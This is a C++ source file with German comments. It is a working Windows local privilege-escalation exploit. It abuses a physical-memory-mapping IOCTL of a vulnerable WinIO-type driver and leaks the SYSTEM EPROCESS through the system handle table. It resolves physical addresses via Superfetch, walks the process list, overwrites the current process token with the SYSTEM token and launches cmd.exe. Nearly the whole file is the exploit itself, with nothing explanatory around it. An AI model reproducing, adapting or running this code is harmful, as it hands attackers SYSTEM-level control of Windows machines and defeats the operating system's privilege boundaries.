#include "DeviceIO.h"
#include "superfetch.h"
#include <iostream>    // fuer std::cout, std::hex, std::endl
#include <cstdint>     // fuer std::uint64_t

DeviceIO io;


// use GlobalMemoryStatusEx to retrieve the highest physical address and specify 
// that we want to map the physical memory up to this last existing physical address. 
DWORD GetHighestMemoryAddress(){

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);

    if (GlobalMemoryStatusEx(&memoryStatus)) {
        printf("[+] Total physical memory: ~0x%llx bytes\n", memoryStatus.ullTotalPhys);
    }
    else {
        printf("[X] Failed to retrieve memory information. Error: %lu\n", GetLastError());
    }

    return memoryStatus.ullTotalPhys;

}


BYTE* g_physicalMemory = nullptr;
MapingInputStruct* input = (MapingInputStruct*)malloc(sizeof(MapingInputStruct));
spf::result<spf::memory_map, spf::spf_error> mm =
spf::result<spf::memory_map, spf::spf_error>::err(spf::spf_error::query_ranges);

PVOID translateAddress(PVOID virtualAddress) {
 
    void const* const virt = virtualAddress;
    std::uint64_t const phys = mm->translate(virt);

    if (!phys) {
        std::printf("[-] Could not translate virtual address: %p\n", virt);
        return nullptr;
    }

    //std::printf("[+] Translated virtual address [%p] to physical address [0x%llX]\n", virt, phys);
    return reinterpret_cast<PVOID>(phys);
}

#define SystemHandleInformation 0x10

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;
    ULONG  GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

ULONG64 LeakSystemEprocess() {
    printf("[+] Leaking System EPROCESS\n"); fflush(stdout);

    // Handle auf SYSTEM Prozess (PID 4) oeffnen
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 4);
    if (!hProcess) {
        printf("[-] OpenProcess(PID 4) failed: %lu\n", GetLastError());
        return 0;
    }

    DWORD myPid = GetCurrentProcessId();
    USHORT myHandleValue = (USHORT)(ULONG_PTR)hProcess;

    printf("[+] Opened handle to SYSTEM process (PID 4)\n");
    printf(">    Current PID:  %lu\n", myPid);
    printf(">    Handle value: 0x%x\n", myHandleValue);
    fflush(stdout);

    // Handle Table querien
    printf("[+] Querying SystemHandleInformation table of current process\n");
    fflush(stdout);

    ULONG len = sizeof(SYSTEM_HANDLE_INFORMATION);
    PSYSTEM_HANDLE_INFORMATION info = NULL;
    NTSTATUS status;
    ULONG out;
    ULONG iterations = 0;

    do {
        len *= 2;
        if (info) GlobalFree(info);
        info = (PSYSTEM_HANDLE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
        if (!info) {
            printf("[-] GlobalAlloc failed at len=%lu\n", len);
            CloseHandle(hProcess);
            return 0;
        }
        status = NtQuerySystemInformation(
            (SYSTEM_INFORMATION_CLASS)SystemHandleInformation, info, len, &out);
        iterations++;
    } while (status == (NTSTATUS)0xC0000004);

    if (status != 0) {
        printf("[-] NtQuerySystemInformation failed: 0x%08X (after %lu resizes)\n", status, iterations);
        CloseHandle(hProcess);
        GlobalFree(info);
        return 0;
    }

    printf("[+] Handle table queried successfully\n");
    printf(">    Buffer size:    %lu bytes\n", len);
    printf(">    Resize rounds:  %lu\n", iterations);
    printf(">    Total handles:  %lu\n", info->NumberOfHandles);
    printf("[+] Searching for handle 0x%x in handle table\n", myHandleValue);
    fflush(stdout);

    ULONG64 systemEprocess = 0;
    ULONG scanned = 0;
    ULONG matchesPid = 0;

    for (ULONG i = 0; i < info->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO entry = info->Handles[i];
        scanned++;

        if (entry.UniqueProcessId == myPid) {
            matchesPid++;

            if (entry.HandleValue == myHandleValue) {
                systemEprocess = (ULONG64)entry.Object;
                printf("[+] Match found at index %lu / %lu\n", i, info->NumberOfHandles);
                printf(">    PID:                      %u\n", entry.UniqueProcessId);
                printf(">    Handle:                   0x%x\n", entry.HandleValue);
                printf(">    Object (System EPROCESS): 0x%llx\n", systemEprocess);
                // printf(">    ObjectType:               0x%x\n", entry.ObjectTypeIndex);
                // printf(">    Access:                   0x%lx\n", entry.GrantedAccess);
                fflush(stdout);
                break;
            }
        }
    }

    if (!systemEprocess) {
        printf("[-] Handle not found. Scanned %lu entries, %lu matched our PID\n", scanned, matchesPid);
    }

    CloseHandle(hProcess);
    GlobalFree(info);

    return systemEprocess;
}


ULONG_PTR findCurrentProcessToken(ULONG_PTR systemEprocessPhys) {

    DWORD myPid = GetCurrentProcessId();

    // ActiveProcessLinks.Flink aus SYSTEM EPROCESS lesen
    ULONG_PTR linksPhys = systemEprocessPhys + EPROCESS_ActiveProcessLinks_OFFSET;
    ULONG_PTR flink = *(UINT64*)(g_physicalMemory + linksPhys);

    // flink zeigt auf ActiveProcessLinks des naechsten Prozesses (virtuell)
    // Wir brauchen fuer jeden Eintrag die physische Adresse
    printf("[+] Searching for current process token. Walking ActiveProcessLinks from System Flink (System EPROCESS + 0x448) to current PID\n");
    printf("[+] Next Flink addr - 0x448 = Next EPROCESS\n");
    while (true) {
        // flink - LINKS_OFFSET = EPROCESS Basis (virtuell)
        PVOID eprocessVirt = (PVOID)(flink - EPROCESS_ActiveProcessLinks_OFFSET);

        // Virtuell -> Physisch via Superfetch



        ULONG_PTR eprocessPhys = (ULONG_PTR)translateAddress(eprocessVirt);
        if (!eprocessPhys) break;

        // PID lesen
        ULONG_PTR pidPhys = eprocessPhys + EPROCESS_PID_OFFSET;
        UINT64 pid = *(UINT64*)(g_physicalMemory + pidPhys);

        if (pid == myPid) {
            ULONG_PTR tokenPhys = eprocessPhys + EPROCESS_TOKEN_OFFSET;
            printf("[+] Found current process (PID %lu) token at [0x%llx]\n", myPid, tokenPhys);
            return tokenPhys;
        }

        // Naechster Eintrag
        ULONG_PTR nextLinksPhys = eprocessPhys + EPROCESS_ActiveProcessLinks_OFFSET;
        ULONG_PTR nextFlink = *(UINT64*)(g_physicalMemory + nextLinksPhys);

        // Zurueck am Anfang? Dann PID nicht gefunden
        if (nextFlink == *(UINT64*)(g_physicalMemory + linksPhys)) {
            printf("[-] PID %lu not found in EPROCESS list\n", myPid);
            return 0;
        }

        flink = nextFlink;
    }

    return 0;
}



PVOID mapSection() {

    DWORDLONG sizeToMap = GetHighestMemoryAddress();

    MapingInputStruct localInput = {};
    localInput.size = sizeToMap;

    DWORD bytesReturned;
    BOOL success = DeviceIoControl(
        io.hDevice,
        IOCTL_WINIO_MAPPHYSTOLIN,
        &localInput,
        sizeof(MapingInputStruct),
        &localInput,
        sizeof(MapingInputStruct),
        &bytesReturned,
        NULL
    );

    if (!success) {
        printf("[-] MapPhysToLin failed: %lu\n", GetLastError());
        return nullptr;
    }

    printf("[+] Mapped physical memory at %p\n", (PVOID)localInput.mappingAddress);
    return (PVOID)localInput.mappingAddress;
}

void unmapSection(PVOID mappedAddr) {
    MapingInputStruct localInput = {};
    localInput.mappingAddress = (ULONG64)mappedAddr;

    DWORD bytesReturned;
    DeviceIoControl(
        io.hDevice,
        IOCTL_WINIO_UNMAPPHYSADDR,
        &localInput,
        sizeof(MapingInputStruct),
        &localInput,
        sizeof(MapingInputStruct),
        &bytesReturned,
        NULL
    );
}


void elevateCurrentProcess(ULONG_PTR systemEprocessPhys) {

    // SYSTEM Token lesen
    UINT64 systemToken = *(UINT64*)(g_physicalMemory + systemEprocessPhys + EPROCESS_TOKEN_OFFSET);
    systemToken &= 0xFFFFFFFFFFFFFFF0;

    // Eigenen Token finden
    ULONG_PTR myTokenPhys = findCurrentProcessToken(systemEprocessPhys);
    if (!myTokenPhys) return;


    printf("[+] Patching current token with SYSTEM token\n");
    printf("[!] ==== Flink addr of current PID - EPROCESS ActiveProcessLinks Offset (0x448) + EPROCESS Token Offset (0x4B8) = Current Token ====\n");
    // Ueberschreiben
    *(UINT64*)(g_physicalMemory + myTokenPhys) = systemToken;
    printf("[+] Token replaced.\n");
    system("cmd.exe");
}



int main() {
    if (!DeviceIO_Open(&io, DEVICE_PATH)) {
        printf("[-] Couldnt open device: %lu\n", GetLastError());
        return 1;
    }
    g_physicalMemory = (BYTE*)mapSection();
    if (!g_physicalMemory) return 1;

    ULONG64 systemEprocessVirt = LeakSystemEprocess();
    if (!systemEprocessVirt) return 1;
  
    mm = spf::memory_map::current();

    if (!mm) {
        switch (mm.error()) {
        case spf::spf_error::raise_privilege:
            std::printf("[-] Failed to acquire required privileges (SeProfileSingleProcess, SeDebug)\n");
            break;
        case spf::spf_error::query_ranges:
            std::printf("[-] Failed to query physical memory ranges via Superfetch\n");
            break;
        case spf::spf_error::query_pfn:
            std::printf("[-] Failed to query PFN data for memory range\n");
            break;
        }
    }


    ULONG_PTR systemEprocessPhys = (ULONG_PTR)translateAddress((PVOID)systemEprocessVirt);
    if (!systemEprocessPhys) return 1;

    elevateCurrentProcess(systemEprocessPhys);

    unmapSection(g_physicalMemory);
    return 0;
}